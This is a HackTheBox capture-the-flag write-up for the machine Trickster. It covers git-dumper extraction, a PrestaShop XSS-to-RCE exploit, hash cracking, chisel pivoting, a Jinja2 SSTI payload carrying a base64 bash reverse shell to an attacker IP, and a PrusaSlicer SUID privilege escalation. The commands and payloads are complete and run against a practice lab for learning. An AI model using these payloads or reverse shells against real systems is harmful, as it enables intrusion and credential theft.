---
layaout: post
image: /assets/images/trickster.png
title: Trickster Write Up HTB
date: 01-02-2025
categories: [Write ups]
tag: [pivoting, ssti, chisel]
excerpt: "Trickster is a medium-difficulty machine on the HackTheBox platform. This machine primarily focuses on web exploitation, leveraging techniques such as SSTI (Server-Side Template Injection) and XSS (Cross-Site Scripting), among others. Additionally, we will need to perform pivoting to gain access to a Docker container and later exploit sudo privileges by analyzing the sudoers configuration"
---

![img-description](/assets/images/trickster.png)

Trickster is a medium-difficulty machine on the HackTheBox platform. This machine primarily focuses on web exploitation, leveraging techniques such as SSTI (Server-Side Template Injection) and XSS (Cross-Site Scripting), among others. Additionally, we will need to perform pivoting to gain access to a Docker container and later exploit sudo privileges by analyzing the sudoers configuration

## ENUMERATION
---
### Nmap Scanning
---
The Nmap scan reveals two open ports: port 22, for which no known vulnerabilities exist in this version, and port 80. Based on this, we can infer that our attack vector will likely be the web

````bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.34 -sCV -vvv

Host is up, received user-set (0.044s latency).
Scanned at 2025-01-30 23:25:56 CET for 25s
Not shown: 62016 closed tcp ports (reset), 3517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCk493Dw3qOjrvMEEvPT6uj4aIc7vb9chLLQr0Wzjiaf8hZ1yXMO6kwPuBjNaP6GouvFd0L7UnpacFnIqkQ9GOk=
|   256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ3pOUJRCVS6Y1fhIFs4QlMFAh2S8pCDFUCkAfaQFoJw
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

### Enumerating website
---
After adding the routing to `/etc/hosts` and enumerating the website, we did not find anything noteworthy, so we decided to search for subdomains.

````bash
❯ gobuster vhost -u http://trickster.htb --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt | grep -v "301"

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://trickster.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: shop.trickster.htb Status: 403 [Size: 283]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
````

Using Gobuster, we found an interesting subdomain. **Disclaimer:** If you get too much information while using Gobuster, you can filter the errors by running `grep -v "301"`
So, now we will enumerate the website in search of subdirectories.

````bash
❯ gobuster dir -u http://shop.trickster.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 283

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shop.trickster.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          283
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 323] [--> http://shop.trickster.htb/.git/]
````
### Gitdumper
---
While enumerating subdirectories, we found a `.git` directory, which allows us to use **git-dumper** to extract all possible information.  
**Git-dumper** is a tool used to dump the contents of a Git repository from a publicly accessible `.git` directory, which may include source code, configuration files, and other sensitive data. You can download it from <a href="https://github.com/arthaud/git-dumper" target="_blank">here</a> 

````python
python3 git_dumper.py http://shop.trickster.htb/.git git_dump
````

We found a username and a directory

![Usersweb](/assets/trickster/admin_path.png)
````bash
git log
commit 0cbc7831c1104f1fb0948ba46f75f1666e18e64c (HEAD -> admin_panel)
Author: adam <adam@trickster.htb>
Date:   Fri May 24 04:13:19 2024 -0400

    update admin pannel

admin634ewutrx1jgitlooaj
````

On the directory we found a login and a version

![Usersweb](/assets/trickster/loginweb.png)

## FOOTHOLD
---
### PrestaShop exploit
---
While researching online, we came across this <a href="https://github.com/aelmokhtar/CVE-2024-34716" target="_blank">exploit</a> 
This exploit achieves RCE on PrestaShop by chaining XSS and CSRF vulnerabilities. A malicious PNG file containing JavaScript is uploaded via the `/contact-us` page. When a customer service agent views the attachment, the XSS payload executes, extracting CSRF tokens from the admin panel. Using these tokens, a malicious theme containing a reverse shell is uploaded. A `.htaccess` file ensures access to the payload, allowing the attacker to trigger the reverse shell and gain control over the server. If you need more information on how it works, here is the <a href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" target="_blank">explanation</a> 

````bash
❯ python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip 10.10.14.9 --admin-path admin634ewutrx1jgitlooaj
[X] Starting exploit with:
	Url: http://shop.trickster.htb
	Email: adam@trickster.htb
	Local IP: 10.10.14.9
	Admin Path: admin634ewutrx1jgitlooaj
Serving at http.Server on port 5000
[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.
listening on [any] 12345 ...
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
Response: 200 -
10.10.11.34 - - [31/Jan/2025 12:26:50] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
Response: 200 -
10.10.11.34 - - [31/Jan/2025 12:26:55] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.34] 47668
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 11:27:02 up 11:55,  0 users,  load average: 0.13, 0.12, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
````

As expected, upon entering as `www-data`, our focus is to navigate to the web application's configuration files and search for database credentials or user information. If found, we will attempt to log in as those users to check if their credentials have been reused.

````bash
www-data@trickster:~/prestashop/app/config$ cat parameters.
cat: parameters.: No such file or directory
www-data@trickster:~/prestashop/app/config$ cat parameters.php 
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
````

In this case, we found the database credentials, but unfortunately, they have not been reused for other users. Therefore, we will need to access the database and see if we can find any other credentials.
## PRIVILEGE ESCALATION
---
````bash
www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -p'prest@shop_o' 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16635
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> USE prestashop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [prestashop]> show tables;
+-------------------------------------------------+
| Tables_in_prestashop                            |
+-------------------------------------------------+

MariaDB [prestashop]> SELECT * FROM ps_employee;
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
| id_employee | id_profile | id_lang | lastname | firstname | email               | passwd                                                       | last_passwd_gen     | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css    | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
|           1 |          1 |       1 | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25      | 2024-05-25    | 0000-00-00         | 0000-00-00       |                    1 | NULL                 | NULL     | default  | theme.css |           1 |        0 |       1 |      1 |  NULL |             5 |                        0 |                0 | 2025-01-31           | NULL                 | 0000-00-00 00:00:00     |                    0 |
|           2 |          2 |       0 | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL            | NULL          | NULL               | NULL             |                    1 | NULL                 | NULL     | NULL     | NULL      |           0 |        0 |       1 |      0 |  NULL |             0 |                        0 |                0 | NULL                 | NULL                 | NULL                    |                    0 |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------
````

In the database, we found several encrypted credentials. I'll start with James' hash, as he is also a user on the machine we are currently on. Given the characteristics of the hash (`$2a$`), we can infer that it uses bcrypt. Therefore, we save it to a file and attempt to crack it using John the Ripper.

````bash
❯ echo '$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm' > hash.txt

❯ john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alwaysandforever (?)     
1g 0:00:00:04 DONE (2025-01-31 12:47) 0.2136g/s 7915p/s 7915c/s 7915C/s bandit2..alkaline
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
````

### Login as james
---
````bash
❯ ssh james@10.10.11.34
The authenticity of host '10.10.11.34 (10.10.11.34)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.34' (ED25519) to the list of known hosts.
james@10.10.11.34's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ cd /home/james
james@trickster:~$ ls  
user.txt
james@trickster:~$ 
````

After a while of enumeration, we realized that we have access to another network interface, which is running a Docker container

````bash
james@trickster:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:17:a8 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:b9:b0:44:c4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
79: vetha9d9138@if78: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 76:a1:56:b7:8e:0f brd ff:ff:ff:ff:ff:ff link-netnsid 0
````
### DISCLAIMER
---
You can completely skip the pivoting part with Chisel by doing it this way, which is easier, but I recommend using Chisel since you don't often get the chance to practice pivoting with this tool.

First, we run this one-liner to scan the new network interface.

````bash
james@trickster:~$ for i in {1..254}; do (ping -c 1 172.17.0.$i | grep "bytes from" &); done
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.081 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.080 ms
````
Now, we use this other one-liner to enumerate open ports.

````bash
for i in {1..65535}; do (echo > /dev/tcp/172.17.0.2/$i) >/dev/null 2>&1 && echo $i is open; done
````
And then, we create the tunnel for the open port we found in the new network using SSH.

````bash
❯ ssh -L 127.0.0.1:5000:172.17.0.2:5000 james@trickster.htb
````


### Pivoting with chisel
---
Therefore, we will attempt to enumerate the new network interface we have discovered. On our blog, you can find more information about <a href="https://whare1.github.io/posts/Pivoting/" target="_blank">pivoting</a> 
, as well as some useful commands and tools like the ones we will use below, along with the download links

````bash
james@trickster:~$ for i in {1..254}; do (ping -c 1 172.17.0.$i | grep "bytes from" &); done
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.081 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.080 ms
````

**Chisel** is a fast TCP/UDP tunnel, transported over HTTP/2, that allows you to create a secure and reliable tunnel through firewalls or NATs. It is commonly used for pivoting, allowing attackers to bypass network restrictions and gain access to internal systems. Chisel is lightweight and supports multiple connections, making it a useful tool for penetration testers and red teamers when tunneling traffic between machines.

Next, we open our `proxychains` configuration and add the `socks5` proxy."

````bash
nano /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
````

After that, we can start our Chisel server on our machine.

````bash
❯ chisel server --reverse -p 8000

2025/01/31 12:59:05 server: Reverse tunnelling enabled
2025/01/31 12:59:05 server: Fingerprint BCG1n7qYcwa7wple3bNHI+l8YtR2YtoQoH83VqOnA1E=
2025/01/31 12:59:05 server: Listening on http://0.0.0.0:8000
````

Then, we transfer the Chisel binary to the target machine to start a Chisel client and connect it to our machine.

````bash
james@trickster:/tmp$ ./chisel client 10.10.14.9:8000 R:socks
2025/01/31 12:03:40 client: Connecting to ws://10.10.14.9:8000
2025/01/31 12:03:41 client: Connected (Latency 46.915879ms)
````

Now, we can analyze the Docker container more comfortably from our machine. In retrospect, this could have been done more easily by using a simple script to scan ports from the target machine and then setting up port forwarding. However, as a best practice, I believe it is better to perform enumeration from our machine using **Chisel** or **Ligolo**.

````bash
❯ proxychains nmap -sT -Pn --top-ports 6000 -open -T5 -v -n 172.17.0.2 2>/dev/null

Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 13:19 CET
Initiating Connect Scan at 13:19
Nmap scan report for 172.17.0.2
Host is up (0.13s latency).
Not shown: 4999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5000/tcp open  upnp
------------------------------------------------------------------------------------------
❯ proxychains nmap -sT -Pn -sCV -p 5000 172.17.0.2 2>/dev/null

PORT     STATE SERVICE VERSION
5000/tcp open  http    Python http.server 3.5 - 3.10
| http-title: Change Detection
|_Requested resource was /login?next=/
````

#### Foxyproxy for visualize the website
---
**FoxyProxy** is a browser extension that simplifies proxy management, allowing users to easily switch between multiple proxies. It is commonly used for routing traffic through SOCKS or HTTP proxies, making it useful for penetration testing and network analysis.

We will use **FoxyProxy** to access the web application from our machine with the following configuration.

![Usersweb](/assets/trickster/foxyproxy.png)

### Web explotation
---
Upon accessing the web application, we encounter a login page where we will use James' credentials.

![Usersweb](/assets/trickster/password_log.png)
![Usersweb](/assets/trickster/frontweb.png)

Searching online, we found that **Change.io** is vulnerable to **Server-Side Template Injection (SSTI)**, which allows us to gain a reverse shell.

**SSTI in Jinja2:** Server-Side Template Injection occurs when user input is incorrectly processed within a template engine, leading to code execution on the server. **Jinja2**, a popular template engine for Python web applications, is vulnerable when user-controlled data is directly evaluated within templates. By injecting malicious payloads, attackers can execute arbitrary commands, read sensitive files, or escalate privileges within the system.

Here is the <a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3">explanation</a>

#### SSTI explotation under the website
---
The first step is to create a reverse shell encoded in **Base64**

````bash
❯ echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.9/4445 0>&1"' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDQ1IDA+JjE=
````
```javascript
{% raw %}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDQ1IDA+JjE=|base64 -d|bash').read() }}
{% endraw %}
```

Next, we navigate to **Settings > Notifications** and inject our malicious command.

![Usersweb](/assets/trickster/ssti.png)

We set up a listener, in my case using a tool that automates shell stabilization and provides additional useful features. However, you can also use `nc`

````bash
❯ revshell -p 4445
[i] Listening on 0.0.0.0:4445...
[+] Connected by 10.10.11.34:37840
[i] Attempting TTY upgrade...
[+] Binary 'python3' is installed, upgrading shell...
[i] Unsetting histfile...
root@a4b9a36ae7ff:/app# 
````

And we've gained access to the Docker container as root. When we originally set up this machine, the creator forgot to delete the `bash_history`, allowing us to obtain the root's password. Unfortunately for you, the machine has  been patched, and now we have to proceed as it was originally designed. Haha.

````bash
root@a4b9a36ae7ff:~# ls -la
total 20
drwx------ 1 root root 4096 Sep 26 10:52 .
drwxr-xr-x 1 root root 4096 Sep 26 11:03 ..
lrwxrwxrwx 1 root root    9 Sep 26 10:51 .bash_history -> /dev/null
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x 1 root root 4096 Sep 13 12:24 .local
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
````

### Enumerating the docker
---
While enumerating the contents of the Docker container, we found an interesting backup, which we will transfer to our machine using `wget` along with `proxychains4`

````bash
root@a4b9a36ae7ff:/datastore/Backups# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.17.0.1 - - [31/Jan/2025 17:16:52] "GET /changedetection-backup-20240830194841.zip HTTP/1.1" 200 -
172.17.0.1 - - [31/Jan/2025 17:17:41] "GET /changedetection-backup-20240830202524.zip HTTP/1.1" 200 -
````

````bash
proxychains4 wget 172.17.0.2:8080/changedetection-backup-20240830194841.zip
proxychains4 wget 172.17.0.2:8080/changedetection-backup-20240830202524.zip

````

We will now decompress the `.zip` files to see what we find.

````bash
❯ unzip *.zip
❯ unzip changedetection-backup-20240830194841.zip
Archive:  changedetection-backup-20240830194841.zip
   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
  inflating: secret.txt              
  inflating: url-list.txt            
  inflating: url-list-with-tags.txt  
  inflating: url-watches.json        
❯ ls
 b4a8b52d-651b-44bc-bbc6-f9e8c6590103        changedetection-backup-20240830202524.zip   url-list-with-tags.txt   url-watches.json
 changedetection-backup-20240830194841.zip   secret.txt                                  url-list.txt            
❯ cd b4a8b52d-651b-44bc-bbc6-f9e8c6590103
❯ ls
 f04f0732f120c0cc84a993ad99decb2c.txt.br   history.txt
````

We found a `.br` file, which we will decompress using the **Brotli** tool.

**Brotli** is a compression algorithm developed by Google, widely used for compressing web data such as HTML, CSS, and JavaScript files. It provides better compression ratios and faster decompression speeds compared to older algorithms like gzip

````bash
❯ sudo apt install brotli
The following package was automatically installed and is no longer required:
  libx265-209

❯ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
❯ ls
 f04f0732f120c0cc84a993ad99decb2c.txt   f04f0732f120c0cc84a993ad99decb2c.txt.br   history.txt
❯ cat f04f0732f120c0cc84a993ad99decb2c.txt
````

### Login as adam
---
In the file, we found valid credentials that allow us to log in as **adam**, so now we can finally close our Chisel sessions and exit the Docker container.


````bash
File: f04f0732f120c0cc84a993ad99decb2c.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │   This website requires JavaScript.
   2   │     Explore Help
   3   │     Register Sign In
   4   │                 james/prestashop
   5   │               Watch 1
   6   │               Star 0
   7   │               Fork 0
   8   │                 You've already forked prestashop
   9   │           Code Issues Pull Requests Actions Packages Projects Releases Wiki Activity
  10   │                 main
  11   │           prestashop / app / config / parameters.php
  12   │             james 8ee5eaf0bb prestashop
  13   │             2024-08-30 20:35:25 +01:00
  14   │ 
  15   │               64 lines
  16   │               3.1 KiB
  17   │               PHP
  18   │ 
  19   │             Raw Permalink Blame History
  20   │ 
  21   │                 < ? php return array (                                                                                                                                 
  22   │                 'parameters' =>                                                                                                                                        
  23   │                 array (                                                                                                                                                
  24   │                 'database_host' => '127.0.0.1' ,                                                                                                                       
  25   │                 'database_port' => '' ,                                                                                                                                
  26   │                 'database_name' => 'prestashop' ,                                                                                                                      
  27   │                 'database_user' => 'adam' ,                                                                                                                            
  28   │                 'database_password' => 'adam_admin992' ,     
````

## ROAD TO ROOT
---
As always, upon accessing a new user, we run `sudo -l` and notice that we can execute **PrusaSlicer** as root.

**PrusaSlicer** is an open-source slicing software for 3D printing, used to convert 3D models into G-code instructions for printers. Since it provides a graphical interface and allows executing scripts, it could be leveraged for privilege escalation

````bash
james@trickster:/tmp$ su adam
Password: 
adam@trickster:/tmp$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
````

The first thing we do is check the version. After that, we search for potential exploits and find this  <a href="https://www.exploit-db.com/exploits/51983">one</a>

````bash
adam@trickster:/opt/PrusaSlicer$ sudo /opt/PrusaSlicer/prusaslicer -v
Unknown option --v

PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
https://github.com/prusa3d/PrusaSlicer
````

````bash
TRICKSTER.3mf
adam@trickster:/tmp/.w$ unzip TRICKSTER.3mf
Archive:  TRICKSTER.3mf
  inflating: [Content_Types].xml     
  inflating: Metadata/thumbnail.png  
  inflating: _rels/.rels             
  inflating: 3D/3dmodel.model        
  inflating: Metadata/Slic3r_PE.config  
  inflating: Metadata/Slic3r_PE_model.config  

adam@trickster:/tmp/.w$ nano Metadata/Slic3r_PE.config
````

"We will transfer **trickster.3mf** to our machine, and after extracting it, we will modify the `Slic3r_PE.config` file by adding `; post-process` followed by our command.

What does `chmod u+s /bin/bash` do?

The `chmod u+s` command sets the **SUID (Set User ID)** bit on `/bin/bash`, meaning that whenever **bash** is executed, it runs with the privileges of its owner (which in this case is **root**). This allows a lower-privileged user to execute `bash` with root privileges, effectively leading to **full privilege escalation**.

![Usersweb](/assets/trickster/nano1.png)

Additionally, we will modify the `output_filename_format` parameter to a custom name ending in `.gcode`

![Usersweb](/assets/trickster/nano2.png)

After that, we can transfer it back to the victim machine and execute it

````bash
adam@trickster:/tmp$ sudo /opt/PrusaSlicer/prusaslicer -s Trickster.3mf
10 => Processing triangulated mesh
10 => Processing triangulated mesh
20 => Generating perimeters
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
30 => Preparing infill
10 => Processing triangulated mesh
20 => Generating perimeters
45 => Making infill
10 => Processing triangulated mesh
30 => Preparing infill
20 => Generating perimeters
45 => Making infill
30 => Preparing infill
45 => Making infill
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
65 => Searching support spots
69 => Alert if supports needed
print warning: Detected print stability issues:

Loose extrusions
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Collapsing overhang
Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Low bed adhesion
TRICKSTER.HTB, Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-Sphere

Consider enabling supports.
Also consider enabling brim.
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Estimating curled extrusions
88 => Generating skirt and brim
90 => Exporting G-code to whare.gcode
Slicing result exported to whare.gcode
````

And if we execute `/bin/bash -p`, we finally become "**root**."

````bash
adam@trickster:/tmp$ /bin/bash -p
bash-5.1# id
uid=1002(adam) gid=1002(adam) euid=0(root) groups=1002(adam)
bash-5.1# cd /root
bash-5.1# ls
changedetection  root.txt  scripts  snap
````

![netrunner](/assets/images/netrunner.gif)